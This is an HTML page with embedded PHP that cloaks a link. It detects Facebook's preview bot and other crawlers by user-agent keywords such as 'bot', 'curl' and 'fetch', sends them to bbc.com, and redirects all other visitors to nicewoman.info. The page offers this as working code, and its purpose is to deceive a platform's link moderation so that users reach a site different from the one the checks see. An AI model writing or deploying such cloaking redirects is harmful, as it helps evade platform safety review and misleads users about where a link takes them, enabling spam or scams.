<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
<head>
	<title></title>
	<meta name=”robots” content=”noindex” />
	<meta name="facebookexternalhit" content="noindex">
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
	<style type="text/css">
		/*<![CDATA[*/
		body {
			background-color: #fff;
			color: #000;
			font-size: 0.9em;
			font-family: sans-serif,helvetica;
			margin: 0;
			padding: 0;
		}
		h1 {
			text-align: center;
			margin: 0;
			padding: 0.6em 2em 0.4em;
			background-color: #22437f;
			color: #fff;
			font-weight: normal;
			font-size: 1.75em;
			border-bottom: 2px solid #000;
		}
		h1 strong {
			font-weight: bold;
		}
		/*]]>*/
	</style>
</head>
<body>
<?php
/**
 * Check if the given user agent string is one of a crawler, spider, or bot.
 *
 * @param string $user_agent
 *   A user agent string (e.g. Googlebot/2.1 (+http://www.google.com/bot.html))
 *
 * @return bool
 *   TRUE if the user agent is a bot, FALSE if not.
 */
function smart_ip_detect_crawler($user_agent) {
  // User lowercase string for comparison.
	$user_agent = strtolower($_SERVER['HTTP_USER_AGENT']);
  // A list of some common words used only for bots and crawlers.
	$bot_identifiers = array(
		'bot',
		'slurp',
		'crawler',
		'spider',
		'curl',
		'facebook',
		'fetch',
		);
  // See if one of the identifiers is in the UA string.
	foreach ($bot_identifiers as $identifier) {
		if (strpos($user_agent, $identifier) !== FALSE) {
			return TRUE;
		}
	}
	return FALSE;
}

?>

<?php 

$ua = $_SERVER['HTTP_USER_AGENT'];

if (preg_match('/facebookexternalhit/si',$ua)) { 
	header('Location: http://www.bbc.com/'); 
	die() ; 
}

if (strpos($_SERVER["HTTP_USER_AGENT"], "facebookexternalhit/") !== false || strpos($_SERVER["HTTP_USER_AGENT"], "Facebot") !== false){
	//it is probably Facebook's bot
	header('Location: http://www.bbc.com/'); 
	die() ; 
}
else {
	if(smart_ip_detect_crawler($ua) == true){
		header('Location: http://www.bbc.com/');
		die() ; 
	}
	else{      // that is not Facebook
		header('Location: http://nicewoman.info'); 
	}
}
?>

</body>
</html>
